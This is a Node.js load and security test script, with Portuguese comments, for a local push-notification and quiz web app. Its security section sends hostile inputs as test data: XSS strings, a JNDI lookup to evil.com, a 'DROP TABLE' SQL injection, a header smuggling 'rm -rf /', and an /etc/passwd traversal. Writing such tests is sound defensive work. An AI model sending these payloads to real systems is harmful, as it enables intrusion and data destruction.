#!/usr/bin/env node

/**
 * TESTES DE CENÁRIOS CRÍTICOS PARA 100K USUÁRIOS
 * Valida casos extremos, recuperação e edge cases
 */

const http = require('http');

class CriticalScenarioTester {
  constructor() {
    this.baseUrl = 'http://localhost:5000';
    this.results = {
      edgeCases: [],
      recovery: [],
      concurrent: [],
      security: []
    };
  }

  async makeRequest(method, path, data = null) {
    return new Promise((resolve) => {
      const options = {
        hostname: 'localhost',
        port: 5000,
        path: path,
        method: method,
        headers: { 'Content-Type': 'application/json' }
      };

      const startTime = Date.now();
      const req = http.request(options, (res) => {
        let responseData = '';
        res.on('data', chunk => responseData += chunk);
        res.on('end', () => {
          resolve({
            success: res.statusCode >= 200 && res.statusCode < 300,
            statusCode: res.statusCode,
            data: responseData,
            duration: Date.now() - startTime
          });
        });
      });

      req.on('error', () => resolve({ success: false, statusCode: 0, data: '', duration: Date.now() - startTime }));
      if (data) req.write(JSON.stringify(data));
      req.end();
    });
  }

  async testEdgeCases() {
    console.log('🧪 TESTE 1: Casos Extremos (Edge Cases)');
    
    const edgeTests = [
      // Subscription com dados extremos
      {
        name: 'Subscription com endpoint muito longo',
        test: () => this.makeRequest('POST', '/api/push-simple/subscribe', {
          endpoint: 'https://web.push.apple.com/' + 'x'.repeat(1000),
          keys: { p256dh: 'test', auth: 'test' }
        })
      },
      // Quiz com payload gigante
      {
        name: 'Quiz submission com resposta de 1MB',
        test: () => this.makeRequest('POST', '/api/quizzes/QEEjFDntXwE-iptFeGIqO/submit', {
          responses: [{ elementFieldId: "nome_completo", value: 'x'.repeat(1000000), pageId: "page1" }],
          metadata: { isPartial: false, completedAt: new Date().toISOString(), totalPages: 1, completionPercentage: 100, timeSpent: 15000, isComplete: true }
        })
      },
      // Notification com caracteres especiais
      {
        name: 'Notification com emojis e caracteres especiais',
        test: () => this.makeRequest('POST', '/api/push-simple/send', {
          title: '🎉🚀💰 Ação Ûnïcôdê 中文 العربية русский',
          message: 'Teste com emojis 😀😎🔥 e caracteres especiais çñüáéíóú'
        })
      },
      // Múltiplas requests simultâneas do mesmo usuário
      {
        name: 'Múltiplas subscriptions simultâneas',
        test: async () => {
          const promises = Array(20).fill().map((_, i) => 
            this.makeRequest('POST', '/api/push-simple/subscribe', {
              endpoint: `https://web.push.apple.com/concurrent-${i}`,
              keys: { p256dh: `test-${i}`, auth: `auth-${i}` }
            })
          );
          const results = await Promise.all(promises);
          return { success: results.every(r => r.success), data: `${results.length} requests`, duration: 0 };
        }
      }
    ];

    for (const { name, test } of edgeTests) {
      console.log(`   🔍 ${name}...`);
      const result = await test();
      console.log(`      ${result.success ? '✅' : '❌'} ${result.success ? 'Passou' : 'Falhou'} (${result.duration}ms)`);
      this.results.edgeCases.push({ name, success: result.success, duration: result.duration });
    }

    const passed = this.results.edgeCases.filter(r => r.success).length;
    console.log(`   📊 Resultado: ${passed}/${edgeTests.length} testes passaram`);
    return passed >= edgeTests.length * 0.75; // 75% success rate
  }

  async testRecoveryScenarios() {
    console.log('🔄 TESTE 2: Cenários de Recuperação');
    
    const recoveryTests = [
      {
        name: 'Subscription após erro de malformed JSON',
        test: async () => {
          // Primeiro causar erro
          await this.makeRequest('POST', '/api/push-simple/subscribe', 'invalid-json');
          // Depois tentar subscription válida
          return this.makeRequest('POST', '/api/push-simple/subscribe', {
            endpoint: 'https://web.push.apple.com/recovery-test',
            keys: { p256dh: 'recovery', auth: 'test' }
          });
        }
      },
      {
        name: 'Stats após múltiplas requests falhadas',
        test: async () => {
          // Múltiplas requests inválidas
          await Promise.all(Array(10).fill().map(() => 
            this.makeRequest('POST', '/api/push-simple/send', {})
          ));
          // Depois verificar se stats ainda funciona
          return this.makeRequest('GET', '/api/push-simple/stats');
        }
      },
      {
        name: 'Quiz submission após timeout simulado',
        test: async () => {
          // Simular carga alta com delay
          const heavyLoad = Array(5).fill().map((_, i) => 
            this.makeRequest('POST', '/api/quizzes/QEEjFDntXwE-iptFeGIqO/submit', {
              responses: [{ elementFieldId: "nome_completo", value: `Recovery Test ${i}`, pageId: "page1" }],
              metadata: { isPartial: false, completedAt: new Date().toISOString(), totalPages: 1, completionPercentage: 100, timeSpent: 15000, isComplete: true }
            })
          );
          const results = await Promise.all(heavyLoad);
          return { success: results.every(r => r.success), duration: 0 };
        }
      }
    ];

    for (const { name, test } of recoveryTests) {
      console.log(`   🔍 ${name}...`);
      const result = await test();
      console.log(`      ${result.success ? '✅' : '❌'} ${result.success ? 'Recuperou' : 'Falhou'} (${result.duration}ms)`);
      this.results.recovery.push({ name, success: result.success, duration: result.duration });
    }

    const passed = this.results.recovery.filter(r => r.success).length;
    console.log(`   📊 Resultado: ${passed}/${recoveryTests.length} cenários de recuperação passaram`);
    return passed >= recoveryTests.length * 0.8; // 80% recovery rate
  }

  async testConcurrencyLimits() {
    console.log('⚡ TESTE 3: Limites de Concorrência');
    
    const concurrentLevels = [10, 50, 100, 200];
    const results = [];

    for (const level of concurrentLevels) {
      console.log(`   🔍 Testando ${level} requests simultâneas...`);
      
      const startTime = Date.now();
      const promises = Array(level).fill().map((_, i) => 
        this.makeRequest('POST', '/api/push-simple/send', {
          title: `Concurrency Test ${i}/${level}`,
          message: `Testing ${level} concurrent notifications`
        })
      );

      const levelResults = await Promise.all(promises);
      const totalTime = Date.now() - startTime;
      const successRate = levelResults.filter(r => r.success).length / level;
      const avgResponseTime = levelResults.reduce((sum, r) => sum + r.duration, 0) / level;

      console.log(`      ✅ ${(successRate * 100).toFixed(1)}% sucesso, ${avgResponseTime.toFixed(1)}ms médio, ${totalTime}ms total`);
      
      results.push({
        level,
        successRate,
        avgResponseTime,
        totalTime,
        throughput: level / (totalTime / 1000) // requests per second
      });

      // Pequena pausa entre níveis
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    this.results.concurrent = results;
    
    // Encontrar ponto de saturação (quando success rate cai abaixo de 95%)
    const saturationPoint = results.find(r => r.successRate < 0.95);
    const maxConcurrency = saturationPoint ? results[results.indexOf(saturationPoint) - 1]?.level || 10 : 200;
    
    console.log(`   📊 Concorrência máxima recomendada: ${maxConcurrency} requests simultâneas`);
    return maxConcurrency >= 50; // Mínimo 50 concurrent requests
  }

  async testSecurityAndValidation() {
    console.log('🔒 TESTE 4: Segurança e Validação');
    
    const securityTests = [
      {
        name: 'Injection attempts em subscription',
        test: () => this.makeRequest('POST', '/api/push-simple/subscribe', {
          endpoint: 'javascript:alert("xss")',
          keys: { p256dh: '<script>alert("xss")</script>', auth: '${jndi:ldap://evil.com}' }
        })
      },
      {
        name: 'SQL injection em quiz response',
        test: () => this.makeRequest('POST', '/api/quizzes/QEEjFDntXwE-iptFeGIqO/submit', {
          responses: [{ elementFieldId: "nome_completo", value: "'; DROP TABLE users; --", pageId: "page1" }],
          metadata: { isPartial: false, completedAt: new Date().toISOString(), totalPages: 1, completionPercentage: 100, timeSpent: 15000, isComplete: true }
        })
      },
      {
        name: 'Headers maliciosos',
        test: async () => {
          return new Promise((resolve) => {
            const req = http.request({
              hostname: 'localhost',
              port: 5000,
              path: '/api/push-simple/stats',
              method: 'GET',
              headers: {
                'X-Forwarded-For': '127.0.0.1; rm -rf /',
                'User-Agent': '<script>alert("xss")</script>',
                'X-Real-IP': '../../../etc/passwd'
              }
            }, (res) => {
              resolve({ success: res.statusCode === 200, duration: 0 });
            });
            req.on('error', () => resolve({ success: false, duration: 0 }));
            req.end();
          });
        }
      },
      {
        name: 'Rate limiting verification',
        test: async () => {
          // Flood de requests para testar rate limiting
          const flood = Array(100).fill().map(() => 
            this.makeRequest('POST', '/api/push-simple/send', { title: 'Flood test', message: 'Rate limit test' })
          );
          const results = await Promise.all(flood);
          // Pelo menos algumas devem ser rate limited (429) ou falharem
          const rateLimited = results.filter(r => r.statusCode === 429 || !r.success).length;
          return { success: rateLimited > 10, duration: 0 }; // Espera que pelo menos 10% sejam limitadas
        }
      }
    ];

    for (const { name, test } of securityTests) {
      console.log(`   🔍 ${name}...`);
      const result = await test();
      // Para segurança, falha é esperada em alguns casos
      const expectedBehavior = name.includes('injection') || name.includes('maliciosos') ? !result.success : result.success;
      console.log(`      ${expectedBehavior ? '✅' : '❌'} ${expectedBehavior ? 'Protegido' : 'Vulnerável'}`);
      this.results.security.push({ name, secure: expectedBehavior });
    }

    const secure = this.results.security.filter(r => r.secure).length;
    console.log(`   📊 Resultado: ${secure}/${securityTests.length} testes de segurança passaram`);
    return secure >= securityTests.length * 0.75; // 75% security compliance
  }

  async testMemoryLeaks() {
    console.log('💾 TESTE 5: Vazamentos de Memória');
    
    const initialMemory = process.memoryUsage().heapUsed;
    console.log(`   📊 Memória inicial: ${(initialMemory / 1024 / 1024).toFixed(1)}MB`);
    
    // Stress test com 500 operations
    for (let batch = 0; batch < 5; batch++) {
      const batchPromises = Array(100).fill().map((_, i) => {
        const index = batch * 100 + i;
        return this.makeRequest('POST', '/api/push-simple/subscribe', {
          endpoint: `https://web.push.apple.com/memory-test-${index}`,
          keys: { p256dh: `memory-test-${index}`, auth: `auth-${index}` }
        });
      });
      
      await Promise.all(batchPromises);
      
      const currentMemory = process.memoryUsage().heapUsed;
      console.log(`   📊 Batch ${batch + 1}/5: ${(currentMemory / 1024 / 1024).toFixed(1)}MB`);
      
      // Forçar garbage collection se disponível
      if (global.gc) global.gc();
    }
    
    const finalMemory = process.memoryUsage().heapUsed;
    const memoryIncrease = (finalMemory - initialMemory) / 1024 / 1024;
    
    console.log(`   📊 Memória final: ${(finalMemory / 1024 / 1024).toFixed(1)}MB`);
    console.log(`   📊 Incremento: ${memoryIncrease.toFixed(1)}MB`);
    
    // Incremento aceitável: menos de 50MB para 500 operations
    return memoryIncrease < 50;
  }

  async runAllTests() {
    console.log('🚀 INICIANDO TESTES DE CENÁRIOS CRÍTICOS PARA 100K USUÁRIOS');
    console.log('='.repeat(70));

    const startTime = Date.now();
    
    const test1 = await this.testEdgeCases();
    const test2 = await this.testRecoveryScenarios();
    const test3 = await this.testConcurrencyLimits();
    const test4 = await this.testSecurityAndValidation();
    const test5 = await this.testMemoryLeaks();

    const totalTime = Date.now() - startTime;
    
    console.log('\n📊 RELATÓRIO FINAL DE CENÁRIOS CRÍTICOS');
    console.log('='.repeat(70));
    console.log(`⏱️ Tempo total: ${(totalTime/1000).toFixed(1)}s`);
    console.log(`🧪 Edge Cases: ${test1 ? '✅ PASSOU' : '❌ FALHOU'}`);
    console.log(`🔄 Recovery: ${test2 ? '✅ PASSOU' : '❌ FALHOU'}`);
    console.log(`⚡ Concorrência: ${test3 ? '✅ PASSOU' : '❌ FALHOU'}`);
    console.log(`🔒 Segurança: ${test4 ? '✅ PASSOU' : '❌ FALHOU'}`);
    console.log(`💾 Memória: ${test5 ? '✅ PASSOU' : '❌ FALHOU'}`);

    const allPassed = test1 && test2 && test3 && test4 && test5;
    const score = [test1, test2, test3, test4, test5].filter(Boolean).length;

    console.log('\n🎯 AVALIAÇÃO FINAL PARA 100K USUÁRIOS:');
    console.log(`📈 Score: ${score}/5 (${(score/5*100).toFixed(1)}%)`);
    
    if (allPassed) {
      console.log('🏆 SISTEMA COMPLETAMENTE APROVADO PARA 100K USUÁRIOS');
      console.log('✅ Robusto contra edge cases, recuperação automática funcional');
      console.log('✅ Suporta alta concorrência, seguro contra ataques comuns');
      console.log('✅ Gerenciamento de memória estável para operação 24/7');
    } else if (score >= 4) {
      console.log('✅ SISTEMA APROVADO COM RESSALVAS PARA 100K USUÁRIOS');
      console.log('⚠️ Monitore os pontos que falharam em produção');
    } else {
      console.log('❌ SISTEMA PRECISA DE OTIMIZAÇÕES PARA 100K USUÁRIOS');
      console.log('🔧 Corrija os problemas identificados antes da produção');
    }

    console.log('\n📋 RECOMENDAÇÕES FINAIS:');
    console.log('• Implemente monitoramento em tempo real (APM)');
    console.log('• Configure alertas para picos de memória/CPU');
    console.log('• Teste em ambiente staging com carga real');
    console.log('• Prepare plano de rollback para deployments');
    console.log('• Configure auto-scaling baseado em métricas');

    return {
      success: allPassed,
      score,
      results: this.results,
      recommendations: score >= 4 ? 'approved' : 'needs_optimization'
    };
  }
}

// Executar testes
if (require.main === module) {
  const tester = new CriticalScenarioTester();
  tester.runAllTests()
    .then(result => {
      process.exit(result.success ? 0 : 1);
    })
    .catch(error => {
      console.error('❌ Erro crítico:', error);
      process.exit(1);
    });
}

module.exports = CriticalScenarioTester;